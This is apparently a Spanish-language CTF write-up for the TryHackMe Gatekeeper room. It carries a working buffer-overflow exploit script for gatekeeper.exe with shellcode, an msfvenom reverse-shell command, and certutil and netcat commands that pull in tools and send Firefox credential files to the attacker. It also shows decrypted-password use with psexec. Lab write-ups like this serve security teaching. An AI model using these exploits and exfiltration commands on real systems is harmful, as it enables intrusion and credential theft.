# Writeup-Gatekeeper

Este Writeup está hecho para la Máquina de Tryhackme Gatekeeper(https://tryhackme.com/room/gatekeeper)

# Primeros pasos
Acceder a este github(https://github.com/therealdreg/x64dbg-exploiting), seguir todos sus pasos hasta poder ejecutar correctamente el x32dbg.

Una vez podamos usar el x32gdb, debemos descargar el "gatekeeper.exe" de la máquina de Tryhackme y pasarla a nuestra máquina virtual de windows para poder empezar a explotarla.

# Descargar Gatekeeper.exe

Primero que todo vamos a realizar un nmap a la máquina víctima en una Linux o una Kali con: ```nmap -sC -sV -Pn -vv MACHINE_IP```

![57a373b19aee24d48914ae251bae749b](https://user-images.githubusercontent.com/107114264/173058420-7c218917-b423-4c14-bfd6-3c3d2f3c281c.png)

El puerto que más llama la atención esta vez sería el 31337 llamado Elite

Vamos a realizar un smblient por si oculta algo este servidor poder verlo a fondo. ```smbclient -L //MACHINE_IP```

![32e4c24ba68b9cfb5ec53af0aee5d9be](https://user-images.githubusercontent.com/107114264/173059439-9805175a-c150-42ce-a880-480df72e7250.png)

Vamos a indagar un poco dentro de Users a ver que encontramos ```smbclient //MACHINE_IP/Users```

![2d63d97605aa85106a276dabba68feec](https://user-images.githubusercontent.com/107114264/173060129-9261986a-73d7-4dd4-980b-fc5259979fda.png)

Vamos a entrar dentro de la carpeta Share a ver que encontramos.

![7852a0ba295c82cc97be9b0fc364a2e8](https://user-images.githubusercontent.com/107114264/173060968-2f62ed3f-4ab2-46a6-9035-617d8ae9791c.png)

Perfecto! Hemos encontrado el programa vulnerable para explotarlo, vamos a descargarlo con un ```get gatekeeper.exe```, lo pasamos al windows, y a explotarlo!

Podéis pasarlo sencillamente arrastrando el archivo de una máquina virtual a otra o primero a la host y después a otra máquina virtual.

# Explicando un poco x32dgb

Abrimos x32dbg dentro del programa abrimos el "gatekeeper.exe"

![20a484767e7c0f7cc06e329081335f63](https://user-images.githubusercontent.com/107114264/173064601-e7caf764-15ac-4f4c-912c-04e2592b995f.png)

Deberáis ver algo así.

Una vez aquí dentro necesitaremos un script o una plantilla la cual os voy a dar:

```
import socket

ip = "127.0.0.1"
port = 31337


# Windows\x86 - Null-Free WinExec Calc.exe Shellcode (195 bytes)
#shellcode_calc = '\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0'

#badchars 

# Dirección de Retorno(retn)

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Tenemos apuntada la shellcode de una calculadora para cuando acabemos con el exploit, ponerlo a prueba antes de lanzarlo contra la máquina de Tryhackme.

Os dejo unos comandos que nos ayudarán a usar mona dentro del x32dgb

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
--------------------------------------------------------------------------------

mona.mona("pattern_create 2000")

mona.mona('bytearray -cpb "\\x00"')

mona.mona('compare -f C:\\logs\\oscp\\bytearray.bin -a ESP')

mona.mona("pattern_offset EIP")

mona.mona("jmp -r esp") 

mona.mona("jmp -r esp -m *") 
```

Una vez hecho todos los pasos anteriores vamos a ir a la parte de "Log" dentro del x32dgb y vamos a ejecutar unos cuantos comandos.

![dcd6f39623786bdcc6c89cbb7e917f5d](https://user-images.githubusercontent.com/107114264/173065797-6468edef-af2a-481f-85df-c7083d0f903e.png)

Primero que todo haremos un ```import mona``` y después un ```mona.mona("help")``` para comprobar que el import mona ha sido introducido correctamente.

Vamos a hacer un ```mona.mona("config -set workingfolder c:\\logs\\%p")``` Para cuando hagamos los bytearray nos cree ficheros y poder revisar alguna información si llegamos a necesitarla.

# Empezando a explotar Gatekeeper.exe con x32dgb

El primer comando que vamos a ejecutar en "Log" es ```mona.mona("pattern_create 2000")``` Copiar y meter dentro de payload el contenido.

![60e935cc8ec08562c7aa918dde96bce9](https://user-images.githubusercontent.com/107114264/173067351-0fb93281-5c53-455f-afa2-8bd636e5cfaa.png)

![ed045ab8447cf024bc03843ba3a703d2](https://user-images.githubusercontent.com/107114264/173067415-939062e6-9567-436d-8b53-914f52f5f379.png)

Hacemos un restart dentro de x32dgb y le damos a run hasta que se ejecute el programa gatekeeper.exe, abrimos una cmd para abrir nuestro script con Python3.

Con este comando podréis abrirlo en el cmd ```c:\Dirección_de_python3\python.exe your_file.py```

Cuando lo ejecutamos, deberíamos ver cambios.

![ca1d558f85034191c4be348180703b16](https://user-images.githubusercontent.com/107114264/173068054-816d9cc4-0002-40e8-8c5b-1490d8bb4cbd.png)

Vamos a ejecutar ```mona.mona("pattern_offset EIP")```. Esto nos dirá cuantos bytes necesitaremos para llegar hasta EIP.

![62fff794a3fae3f47133e1ee847f8540](https://user-images.githubusercontent.com/107114264/173068860-1e237e3a-faab-4cf8-bdf6-f7f5a417378b.png)

Colocaremos 146 \x41 que en ASCII son A y otras 4 \x42 que en ASCII son B para saber si realmente llegamos a EIP, esto lo sabremos si en esta dirección aparecen 4 \x42 es decir 4 B.

```
payload = "\x41" * 146
payload += "\x42" * 4
```

Hacemos de nuevo un reinicio, ejecutamos hasta que gatekeeper.exe esté ejecutado y ejecutamos nuestro script.

![4268f6d92854056f917132aa0bbdad29](https://user-images.githubusercontent.com/107114264/173069405-ea4ff230-eea5-4f3a-89fb-abe78d4ee8b5.png)

Aquí ya veríamos que la dirección EIP tiene las 4 B, así que toca seguir explotando este programa.

# Buscando bachars en gatekeeper.exe con x32dbg

Tendremos que crear nuestro primer bytearray para este programa ```mona.mona('bytearray -cpb "\\x00"')``` usándolo en "Log", añadiendolo debajo de las 4 B y empezaremos asumiendo que el \x00 es un badchar es decir un byte no legible por este programa.

```
payload = "\x41" * 146
payload += "\x42" * 4
payload += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
payload += "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
payload += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
payload += "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
payload += "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
payload += "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
payload += "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
payload += "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
Hacemos de nuevo un reinicio, ejecutamos hasta que gatekeeper.exe esté ejecutado y ejecutamos nuestro script.

Cuando veamos las 4 B en EIP y todo correctamente, nos dirigimos a "Log" y ejecutamos lo siguiente para saber el siguiente badchar.

```mona.mona('compare -f C:\\logs\\gatekeeper\\bytearray.bin -a ESP')```

![ea48f102a269b9ddf9d21411bdd8b8af](https://user-images.githubusercontent.com/107114264/173070653-1039e638-0a2e-41cb-b657-57c01309e07a.png)

El siguiente posible badchar sería \x0a, así que vamos a añadirlo. ```mona.mona('bytearray -cpb "\\x00\\x0a"')```

Cambiamos el anterior que estaba con los payloads por el nuevo, Reiniciamos el programa le damos a ejecutar hasta que gatekeeper.exe se ejecute y ejecutamos nuestro script.

Volvemos a hacer un ```mona.mona('compare -f C:\\logs\\gatekeeper\\bytearray.bin -a ESP')``` para ver si hay más.

![21ab629ecc82634096fc018c4d3305c5](https://user-images.githubusercontent.com/107114264/173072708-c8c90d45-a89f-4e7c-9fc5-16ac337689bb.png)

Hooray!!!!, ahora tocaría buscar jmp esp es decir un jump al stack.

# Buscando jmp esp para gatekeeper.exe con x32dbg

Vamos a reiniciar el programa ejecutarlo hasta que abra y sin ejecutar el script vamos a "Log" y ponemos lo siguiente ```mona.mona("jmp -r esp")```

![efac4c9c54c53db38425e18da52100fa](https://user-images.githubusercontent.com/107114264/173073881-f7f42b58-2cee-4f7b-9bfe-caa4cab2f1c5.png)

Salen 2 y en mi caso usaré el primero ```0x080414c3``` Añadirlo a Retn dentro del script y después hacerle una llamada de esta manera.

```
import socket

ip = "127.0.0.1"
port = 31337


# Windows\x86 - Null-Free WinExec Calc.exe Shellcode (195 bytes)
shellcode_calc = '\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0'

#badchars 0x00 0x0a

# 0x080414c3 (retn)

prefix = ""
offset = 0
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = ""
payload = "\x41" * 142
payload += retn
payload += shellcode_calc
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
Vamos a meter también la shellcode de la calculadora y así probaremos si todo está funcionando correctamente.

Reinciamos el programa esperamos a que se ejecute y lanzamos nuestro script

Si habéis seguido todos los pasos bien debería abrirse una calculadora.

Ahora faltaría pasar el script a una Linux o una Kali, meterle una reverse shell, poner la ip de la máquina y deberíamos poder entrar en el ordenador.

# Creando la reverse shell con msfvenom

Con este comando crearemos la reverse.

```msfvenom -p windows/shell_reverse_tcp LHOST=VPN_IP LPORT=4444 -b "\x00\x0A" -f c -e x86/shikata_ga_nai```

![c60a5169e63be7c6d6a7deca0032b9af](https://user-images.githubusercontent.com/107114264/173076412-c4a48f8c-069e-4fc8-a2ba-da42cb2c7a53.png)

Vamos a introducir esta shell en nuestro script, donde antes estaba la de la calculadora.

![ab498e6480b7e5b33d678285d4c403c7](https://user-images.githubusercontent.com/107114264/173077272-8f2cf942-2b3f-4be4-835e-b201c2f6288d.png)

Añadiremos 32 NOP (\x90) ya que muchas veces creando una shell con msfvenom tienden a autodestruirse y necesitan más espacio en blanco para funcionar.

# Ejecutando el exploit contra gatekeeper.exe

Vamos a poner una terminal a la escucha con ```nc -nvlp 4444``` después de esto ejecutar el exploit con ```python3 file.py```

Si todo ha funcionado correctamente deberíais estar dentro de la máquina.

![cc7d93d30fdcea4a65528e34675baeca](https://user-images.githubusercontent.com/107114264/173077994-746fd60d-6ce9-4a09-8c22-fcce4ff70532.png)

# Escalado de Privilegios

En este mismo directorio nos encontramos con la primera flag ```user.txt.txt``` podéis verlo con ```dir``` y leerlo con ```more user.txt.txt```

A partir de ahora vamos a empezar la escalada hacia ```root```

Dentro de la máquina de Tryhackme iremos al siguiente directorio usando ```C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release```

Si hacemos un ```dir``` encontramos dos archivos ```key4.db``` y ```loging.json``` básicamente son claves encriptadas antes guardadas en Mozilla Firefox.

![3e62072ece45f2b679ee71e5fa98d968](https://user-images.githubusercontent.com/107114264/173079517-1af0d6aa-c229-4ab8-b145-ae9a45ad0951.png)

Primero de todo en nuestra Kali descargaremos netcat para más tarde pasarla a la windows y poder coger esos dos archivos.

```wget https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip``` Le hacemos un unzip.

También descargaremos ```https://github.com/lclevy/firepwd.git``` que será nuestra herramienta para desencriptar las claves.

Ahora haremos un servidor con ```python3 -m http.server``` y podremos coger el nc con ```certutil -urlcache -f "http://VPN_IP:8000/nc.exe" nc.exe```

![0923c1540a7aed4bce15a4da6a491d9e](https://user-images.githubusercontent.com/107114264/173079826-8154adbd-54c8-4330-9e43-ed9db955254b.png)

Primero ponemos a la escucha con estos comandos,para recibir los dos archivos de la misma manera ```nc -nlvp 1234 > logins.json``` ```nc -nlvp 1234 > key4.db```

Después de estar a la escucha en la máquina de Tryhackme ejecutaremos ```nc.exe -nv VPN_IP 1234 < logins.json``` ```nc.exe -nv VPN_IP 1234 < key4.db```

![cdbc196f268cd005f20552b0bd3e572d](https://user-images.githubusercontent.com/107114264/173080475-a1fcf4ab-3e47-4d02-ba15-d623cb173e6f.png)

Así igual con logins.json.

![e2dc0c4e6ca4838306737d960d70fb9b](https://user-images.githubusercontent.com/107114264/173080706-84d099ec-d456-4fff-9247-2d441b872909.png)

Ahora necesitamos pasar estos dos archivos a nuestra carpeta firepwd. ```mv key4.db firepwd/```  ```mv logins.json firepwd/```

Entramos dentro del directorio firepwd y instalamos los requeriments.txt con ```pip install -r requirements.txt```

Una vez installados los requeriments ya podemos ejecutar el firepwd.py y desencriptar las claves. ```python3 firepwd.py```

![172977157-30783be2-abe2-4920-839b-66c80a5b3a1e](https://user-images.githubusercontent.com/107114264/173081955-8f5efdc7-c3ea-49f9-838e-2a29faafc075.png)

¡Perfecto, ahora sabemos la contraseña de mayor!

Ejecutando el siguiente comando si habéis seguido todo paso a paso deberíamos poder acceder a la máquina de Tryhackme como root.

¡¡¡AVISO!!!: ANTES DE USAR EL ANTERIOR COMANDO CERRAR LA ANTERIOR TERMINAL DONDE TENGAIS ABIERTA LA MÁQUINA DE TRYHACKME

```python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@MACHINE_IP cmd.exe```

![7db635c760a4fead7d1869502b1149e6](https://user-images.githubusercontent.com/107114264/173082705-0a4bfeeb-d3f1-4dbc-b26b-32ab32190322.png)

¡Con esto ya tendríamos root!

Espero que hayáis aprendido mucho, ¡que tengais buen día!
